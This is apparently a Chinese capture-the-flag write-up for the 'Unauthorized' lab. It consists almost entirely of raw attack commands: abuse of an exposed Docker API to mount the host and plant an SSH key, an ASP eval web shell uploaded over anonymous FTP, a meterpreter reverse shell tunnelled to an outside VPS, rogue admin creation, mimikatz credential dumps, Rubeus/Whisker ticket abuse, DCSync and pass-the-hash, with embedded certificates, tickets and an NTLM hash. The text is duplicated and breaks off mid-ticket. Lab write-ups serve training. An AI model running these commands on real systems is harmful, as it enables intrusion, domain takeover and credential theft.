# 春秋云镜——Unauthorized WriteUp

> 原文: https://www.ctfiot.com/69927.html
> ID: 69927

#查看镜像docker -H tcp://47.92.205.41:
2375 images
#查看容器docker -H tcp://47.92.205.41:
2375 ps -a
#启动容器并将宿主机磁盘挂载到/mntdocker -H tcp://47.92.205.41:
2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
#写入ssh公钥cd /mnt/root/.ssh/echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfQOfXEwPv1JydnygS+ILoSrP7ENWuYV5u+FciqjN2mKh9yHgjH/hgRVi03utzAST1G2b/G5Oh61YxDS97CUC45gdcvWJzZ9jI6hrbx/OSrvM2yTg0rY5lDiR/JDAwVPi4aSeZnlKfSLjR9PefR68GVMdD9HzefH5gQieaMSPMnCUsicIV0yekWvUK/ogXPP9GV0NcbWDYgPjIlua8VHUsm9IZBeOJucGTClD6uPNUAG1cslVcvLEvElTPlkHQjOoOQ/fdqubei/BEvy01Jm+Ele9gNoorvAa+gMO90lVbf7ds7OEh/AI2spwWT/frJNy8di3qZA3W/G7/WKwYkT+rqyFtnGIElpEb2++xrBZXNLfrDHgusex8jKAhivAAxGb3lfBVBfsdWeQds5D31GnYSeRwFJ0nYjtvxkxFMm8JDPjOYT2gzGp+WwD7fj6z9sirGaYwnEPKmfqmM+s/Bv1ySbtK4iOx4+yoPCItwDPhjlohQLq4VrwoD54zIZO6Zcs= root@kali" > authorized_keys

#查看端口开放netstat -aptn

#查看历史命令history

mysql -uroot -p123456
mysql> show databases;mysql> use secret;mysql> show tables;mysql> select * from f1agggg01

nmap -sT -A 172.22.7.0/24
Nmap scan report for 172.22.7.67Host is up (0.00023s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 07-09-22 09:
29PM 25356 1-1P3201024310-L.zip| 07-09-22 09:
29PM 42984 1-1P320102603C1.zip| 07-09-22 09:
29PM 39333 1-1P320102609447.zip| 07-09-22 09:
29PM 38231 1-1P320102615Q3.zip| 07-09-22 09:
29PM 43240 1-1P320102621J7.zip| 07-09-22 09:
28PM 25105 1-1P320102J30-L.zip| 07-09-22 09:
29PM 29023 1-1P3201210390-L.zip| 07-09-22 09:
29PM 41885 1-1P3201211110-L.zip| 07-09-22 09:
29PM 36787 1-1P3201211380-L.zip| 07-09-22 09:
29PM 31986 1-1P3201211570-L.zip| 07-09-22 09:
30PM 9733 1-1P320163434135.zip| 07-09-22 09:
29PM 12172 1-1P320163J2J2.zip|_07-09-22 09:
29PM 8705 1-1P320163P3963.zip| ftp-syst: |_ SYST: Windows_NT80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: XIAORANG| NetBIOS_Domain_Name: XIAORANG| NetBIOS_Computer_Name: WIN-9BMCSG0S| DNS_Domain_Name: xiaorang.lab| DNS_Computer_Name: WIN-9BMCSG0S.xiaorang.lab| DNS_Tree_Name: xiaorang.lab| Product_Version: 10.0.17763|_ System_Time: 2022-11-03T07:06:36+00:00| ssl-cert: Subject: commonName=WIN-9BMCSG0S.xiaorang.lab| Not valid before: 2022-07-06T08:54:09|_Not valid after: 2023-01-05T08:54:09|_ssl-date: 2022-11-03T07:06:43+00:00; 0s from scanner time.8081/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | ASPSESSIONIDCCCCDAQR: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: xE5x85xACxE5x8FxB8xE7xAExA1xE7x90x86xE5x90x8ExE5x8FxB0

ftp 172.22.7.67ftp> put shell.asp shell.asp
#shell.asp<%eval request("pass")%>

SweetPotato.exe -a "whoami"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.7.13 LPORT=1080 -f exe > exp.exe

msf6 > use exploit/multi/handlermsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) > set LHOST VPS_IPmsf6 exploit(multi/handler) > set LPORT 4444

./tcptunnel --local-port=1080 --remote-port=4444 --remote-host=123.56.220.163 --fork --buffer-size=8192 --stay-alive

net user dawn P@ssw0rd /addnet localgroup administrators dawn /add

net user zhangfeng /domainnet user chenwei /domain

mimikatz.exe "privilege::
debug" "sekurlsa::
logonpasswords full" exit

Whisker.exe add /target:
DC02$ /domain:
xiaorang.lab /dc:
DC02.xiaorang.lab

Rubeus.exe asktgt /user:
DC02$ /certificate:
MIIJsAIBAzCCCWwGCSqGSIb3DQEHAaCCCV0EgglZMIIJVTCCBg4GCSqGSIb3DQEHAaCCBf8EggX7MIIF9zCCBfMGCyqGSIb3DQEMCgECoIIE9jCCBPIwHAYKKoZIhvcNAQwBAzAOBAhQxPps6z+bUAICB9AEggTQeRMbP4icmyH8GrwzFDjsxBrTRKsZKUYrsaphXz0xXzzkkfnXCObQ7rjbxUvsgr3IqfmimxrqKUQH6Hf8v/FDvIxGLG50JKZqZQiSZmeqTM0zFzmgKleeMNGtRFAHkg4QE7boorHT9yt1Xy0nvuBo8KVUb9yAsh5iX605SZczITgcQgxpuW2PnjhA6u4lI/iBDHqt3ELQpH1hadZ1qAG5lX/CCcQzw1iBQccivKS5cpymur8pIOPLWEJUMkSO3SeD5uFulm/QjiOs3SkQTuLcun/VE1ouPE94nzEAZgErfm2BGBPabzyZ9FA3FrS7tEBWbj1E3xXXjymbsuuAkJ5Jv5jrNIExP4J+xhBHELgAkhfgIzAOiP9943C41ZrTT5Z+pSQ8Ohnoj3tUVmIHtSnpg1AGv/XiEEAKVkI0vbnll6cjwHmb2SucjK/dVO/eiDsLdbe1O7u1wcYuszpAzsy96QEC5iFmVz1gDdI2BFIkf6W/aJ7toH4FaysPi9CJ8TL0E31eMdi67p15WlmXFxme1Vza1iE5h/lFxKOkybBeSaazTt81cPOXuL2nUuSDSrBBF2e2qm0Y3cwJS/WSq1ZCp33C/AC45Rs9+ywAlMp6DOcvY06rs3qjvBrIE0nRcD/+4URx3vqtVPTjk0cytayhmfc0FVCRGueXhN5R351h8ysdbmDv0dT61gqsMFQYerUYvU2oX1yoR0WnNDwP6WD0keXsJzTnOVOko0jfQ4vDQVMOIz0g1vhxqXVQrgpWcLLLlZ6auuZj/DUUOjGpKVm9nkSTmDi8Qw+2X3pxohZcUiz1ZFgAwNBm3Fwsk4NhmrzV1mRKgRhCG0ihTRbQLiB0FEfZrxddrjXe2PEh+SdOjv5/H3Yu3zKbaTci2ochGw/1152MZljpfgSMQyRcFW3s9gZBEYr8yv0JnUvlIlmsHNYHpQCzR0EK6IS/laPaQ+lLxhrB5bVPsnnJ01HzQz+kqBZVbfsSRsiD5rbgeCM4Aj28Ou3n9/AZDCU4KaIORP5mPkCFGYZY8XYrf1qHYhWmKfRjq7B8JXxbJa9ReabppMuG2Y565RONsjjczna+aoPy0d1OrDmvm3wEtO9r4l0nB2qlfoOofSUQJDUpZryVHQz47xPLz82JkxazySW/1L+vURNk6tl4e+yrJZd6KaH6TrA/6KwcJ315OzHZUAy5xzXhklarFa2W4mEgX+UHQ5wX2P4W659aQgdQDLl+XQbaR3VAzkahpwi1wdIknO5uNwBqCxjdeyDsFsCbQPE8eeGeM9HPkh59+qmkhSRUbTb7AYcwOrtsr2Uh8R2Y72qR74eSlhNvZgJ1gaiUZpmEWwl1LqA22TMyKYTNrHZTnDykGez3SDbMceFtm+0ONwshPMfrczhl8x8zhucWk4U3jFLYWgK4LXkG01nwcS1BttUGG3igsqJydYeBNinc4l0PV4Zvx29SPrsEn+9ohkAjXw4KhpwxE0yWLWrhC/7xA84IQEaOaNWvQ+Zvssc3mGxJIdZPtQqn29AI7Xm8RMG1DtGymLsqwNJVEsnHejdB17K3raAxsnXoANUF/xYn6luT+utEhOZH1mEd7o5QZBWP4xuOlPpzgjUAv8Pt5WGxeKK5kVx9D5c/Ya+9F4Rp1Xdlu28xgekwEwYJKoZIhvcNAQkVMQYEBAEAAAAwVwYJKoZIhvcNAQkUMUoeSAAwAGMAYQAzAGEAMQBjADcALQAyADcAYwBjAC0ANAA3ADMAOAAtAGIANwA0ADUALQBmAGYANAAxAGUAMgA4AGUAYQA5AGUAZTB5BgkrBgEEAYI3EQExbB5qAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAAUgBTAEEAIABhAG4AZAAgAEEARQBTACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcjCCAz8GCSqGSIb3DQEHBqCCAzAwggMsAgEAMIIDJQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIby8CmE3LbjcCAgfQgIIC+EhZU5dyTv8rJ/riTM/rdYVSArg4LLlStEhs/T81IDWRq99nP1wtBfcAolM9Dk9OySI4LOEp6idNlfH8FKHGei1/uSsl9/UvdGwCR0SqXT/BGh6+tr5f2hmbMaNYIZLok0GRJtB6icdtcuUW+S+dpIqOgoaFAxGW7mLBEYu478PVP4Wjp2HhnT4/lZOLBOn3l7M/wPj1u9FY5pY2tNoCqrPj0i/zQmi3Zxqaxx06OaxBFGI/duTou/qPP3RgAWQ8biABNmbbFORE5tsEynb56Gok2iIyC5uAtXnP9HCkxO13/NcaLv+8NAe6azsXK9aoyXxoejjoTaxc2bSngYVVcmec8XBJ+w+zBykSWIU7P+p0hlPaK+hpQ6N84yVCJYkbNRO3Rvyq+PHMUwgGTtV1TWTOmTmriVz05z39KYtIah5yMMKuND3whEsMnv9YuguhBpis4dFeNqyJyaTCD/B6NLW88B7/IvTdWuT22lkX7oasYXVwk3ndQDmRBJrXHURp3vOkjSjgeY0YZR5xpxW6ZfRrUFakGkmfdl6rL3CjMzepbsgESoszRuHG3Qheuc0bvXh2GtQTXXQjf6VYcJFLzDpdevC/E0TIj+Zp8wfxB5Av7IL6dju45l9M/7LKAIMlIqyBBDxi4noIyuexQovD0RTgCO6jURWlvBjZQBg3bAs2F4Otlr57nAATF70P2MNjTQ8AXrZk7j1M8Kx5t48LTaq4m1uTYrFIug/+eGZWT3ElKC6pL8WX+JUltIGe/qu/e9W4EwZu/VKHUrtkI6/j7qqQ+lo9L0rA/w8RKXEoUxL4/mI2zwAGSV+qB/+s+wKC56HFE7IDB+D/gTaQ/AHuu6SQIb4xItXKJtrpzxs5YmvA0KUlUu3CVq+jrv6jowP1DvjmN0L/8/MfixE87dz3kwCjzZKqs+cUmXJJagO4jzMkpqp0BSq5LGMOJ+qdpkk0VtWcuKMMDr46/4XmkMJC7xwXkLmfs72jEVw0FH/MhV+t6dqZ0vIylq4wOzAfMAcGBSsOAwIaBBQXFhADmGEtCQXpWGChHKrBU92ybwQUuvskRICPtH91kVisTZgIMx+ehPUCAgfQ /password:"6pyjm6QpK6Xz0PHE" /domain:
xiaorang.lab /dc:
DC02.xiaorang.lab /getcredentials /show /ptt

mimikatz.exe "lsadump::
dcsync /domain:
xiaorang.lab /user:
Administrator" exit

Rubeus.exe s4u /self /impersonateuser:
Administrator /altservice:
CIFS/DC02.xiaorang.lab /dc:
DC02.xiaorang.lab /ptt /ticket:
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

proxychains python3 wmiexec.py -hashes 00000000000000000000000000000000:
bf967c5a0f7256e2eaba589fbd29a382 Administrator@172.22.7.6


```
#查看镜像docker -H tcp://47.92.205.41:
2375 images
#查看容器docker -H tcp://47.92.205.41:
2375 ps -a
#启动容器并将宿主机磁盘挂载到/mntdocker -H tcp://47.92.205.41:
2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
#写入ssh公钥cd /mnt/root/.ssh/echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfQOfXEwPv1JydnygS+ILoSrP7ENWuYV5u+FciqjN2mKh9yHgjH/hgRVi03utzAST1G2b/G5Oh61YxDS97CUC45gdcvWJzZ9jI6hrbx/OSrvM2yTg0rY5lDiR/JDAwVPi4aSeZnlKfSLjR9PefR68GVMdD9HzefH5gQieaMSPMnCUsicIV0yekWvUK/ogXPP9GV0NcbWDYgPjIlua8VHUsm9IZBeOJucGTClD6uPNUAG1cslVcvLEvElTPlkHQjOoOQ/fdqubei/BEvy01Jm+Ele9gNoorvAa+gMO90lVbf7ds7OEh/AI2spwWT/frJNy8di3qZA3W/G7/WKwYkT+rqyFtnGIElpEb2++xrBZXNLfrDHgusex8jKAhivAAxGb3lfBVBfsdWeQds5D31GnYSeRwFJ0nYjtvxkxFMm8JDPjOYT2gzGp+WwD7fj6z9sirGaYwnEPKmfqmM+s/Bv1ySbtK4iOx4+yoPCItwDPhjlohQLq4VrwoD54zIZO6Zcs= root@kali" > authorized_keys
#查看端口开放netstat -aptn
#查看历史命令history
mysql -uroot -p123456
mysql> show databases;mysql> use secret;mysql> show tables;mysql> select * from f1agggg01
nmap -sT -A 172.22.7.0/24
Nmap scan report for 172.22.7.67Host is up (0.00023s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 07-09-22 09:
29PM 25356 1-1P3201024310-L.zip| 07-09-22 09:
29PM 42984 1-1P320102603C1.zip| 07-09-22 09:
29PM 39333 1-1P320102609447.zip| 07-09-22 09:
29PM 38231 1-1P320102615Q3.zip| 07-09-22 09:
29PM 43240 1-1P320102621J7.zip| 07-09-22 09:
28PM 25105 1-1P320102J30-L.zip| 07-09-22 09:
29PM 29023 1-1P3201210390-L.zip| 07-09-22 09:
29PM 41885 1-1P3201211110-L.zip| 07-09-22 09:
29PM 36787 1-1P3201211380-L.zip| 07-09-22 09:
29PM 31986 1-1P3201211570-L.zip| 07-09-22 09:
30PM 9733 1-1P320163434135.zip| 07-09-22 09:
29PM 12172 1-1P320163J2J2.zip|_07-09-22 09:
29PM 8705 1-1P320163P3963.zip| ftp-syst: |_ SYST: Windows_NT80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: XIAORANG| NetBIOS_Domain_Name: XIAORANG| NetBIOS_Computer_Name: WIN-9BMCSG0S| DNS_Domain_Name: xiaorang.lab| DNS_Computer_Name: WIN-9BMCSG0S.xiaorang.lab| DNS_Tree_Name: xiaorang.lab| Product_Version: 10.0.17763|_ System_Time: 2022-11-03T07:06:36+00:00| ssl-cert: Subject: commonName=WIN-9BMCSG0S.xiaorang.lab| Not valid before: 2022-07-06T08:54:09|_Not valid after: 2023-01-05T08:54:09|_ssl-date: 2022-11-03T07:06:43+00:00; 0s from scanner time.8081/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | ASPSESSIONIDCCCCDAQR: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: xE5x85xACxE5x8FxB8xE7xAExA1xE7x90x86xE5x90x8ExE5x8FxB0
ftp 172.22.7.67ftp> put shell.asp shell.asp
    #shell.asp<%eval request("pass")%>
SweetPotato.exe -a "whoami"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.7.13 LPORT=1080 -f exe > exp.exe
msf6 > use exploit/multi/handlermsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) > set LHOST VPS_IPmsf6 exploit(multi/handler) > set LPORT 4444
./tcptunnel --local-port=1080 --remote-port=4444 --remote-host=123.56.220.163 --fork --buffer-size=8192 --stay-alive
net user dawn P@ssw0rd /addnet localgroup administrators dawn /add
net user zhangfeng /domainnet user chenwei /domain
mimikatz.exe "privilege::
debug" "sekurlsa::
logonpasswords full" exit
Whisker.exe add /target:
DC02$ /domain:
xiaorang.lab /dc:
DC02.xiaorang.lab
Rubeus.exe asktgt /user:
DC02$ /certificate:
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 /password:"6pyjm6QpK6Xz0PHE" /domain:
xiaorang.lab /dc:
DC02.xiaorang.lab /getcredentials /show /ptt
mimikatz.exe "lsadump::
dcsync /domain:
xiaorang.lab /user:
Administrator" exit
Rubeus.exe s4u /self /impersonateuser:
Administrator /altservice:
CIFS/DC02.xiaorang.lab /dc:
DC02.xiaorang.lab /ptt /ticket:
doIGPDCCBjigAwIBBaEDAgEWooIFVDCCBVBhggVMMIIFSKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IFDDCCBQigAwIBEqEDAgECooIE+gSCBPb+80xjsUsbDHCqnaH//Rte98+n15xaSTv7tuBz2qqddsaksHyTQ1OpqoX9QfsKzdwdaLKWu2125ueVso7Wh0Wrwt+QvAB4ulod4+09Cpcz+KLmp0ME8EgFtQGn0wx7HlMcIJNzQz53mTe+SEXmCw4cYxN2Q6YH1APRAR59J+0AmEn02YW/GOLFlJQNoVfrXbU7y87kQO+XmDbTNj8RYbCdwM6inVB5Xbiq/ero+M2FrYMSnIJSJ0mUlFWjTACoBLMgdJrwEUHL8txi53EMam4On/IMYiQQnepl1vFPsRY35ti9uPi9tA0bv1PTR+JadOdkZVTRJLg/Vy5w2F4jfJmqdm3cj3sqT1EbftAf94Raa4S2TI+AlpzjssmKX2wAkpupqN3icLHq4Lfk+j4gm5K7dMn7ZifXF1jmLjIla3iNzcKgpl3CX6gAqZrOIipi0Vyfow2vOYpj5X3MIi2UvV/1Wof8OB5FFjiVNWGQMjuVXPePU/ol2DSKBafO/ihx5gPDBQNL7DiOMpsjXiaGQVqdc6oLm/me2r/PNSW/6DZSJrgLasuxS1TOrDbif3i3mb3hHng3q5eAfF1HsPuXuuYxYdPxhHpvNfG+tHtqnPVPnW/+l7oUKMCkHpVjSzB1hliXMh7jlYtHIoJPWuVK8IFwrcyTCoh35bq4BbqMWw/nnawIFs699g3l8fOF7mOF26axgNo0ULwRU8eukV5TiL+Z//tp81+SFArGxmzjRfcEPvgieV8i5NAqtToRytv9ZnZAD/5I8VMWfyAD3duzG78D6SWXrGPGAYT20d6p0Hl19wTz3pDzpc2RotNQv/MQ+3qls1tHZAETRUaATptDzGFfECg1gzF8x2Z3n/AxBjB3euJDFKZ5kG2vIeVYBzC0TZOfFqZWKv5oSOsJmwERDtOV06j4QFpHZS+JpxGt0chnjs2u4I1W+MU2bby/TuFSWffa4jag1jdALFJL+atRzdn5LcMAMu+s6g4QAl5OH7MVo9NOpxpbI768Rju1Fwpv8SJ8pZ4a/c2/ulvSdI5wkEfFEu/oj+EE20UDoGZksiuMNo/HmY4kd+WtmB+ercq53ZJEsiZObyuHLi63RlWpVmB7+jBRfEmnUF9nuYmFgdTv0MSn6bOVv0XoBBmyYyQUh1MlIkExQeV776+VzqG3pMJXAjJdr2Yzod7NJ7n7Hx/wbDUwfIvSTnM0b99tDyhnjkX23ivwpTlVmWlchaRdwDFExvf0RlQPzgVs8ISUtoZe8Fr8Sdo5aRgUPF8N/9Kg8Y9JrRVucaiYfWIEF0nkxpZ7uTK4ggYE0EEJ43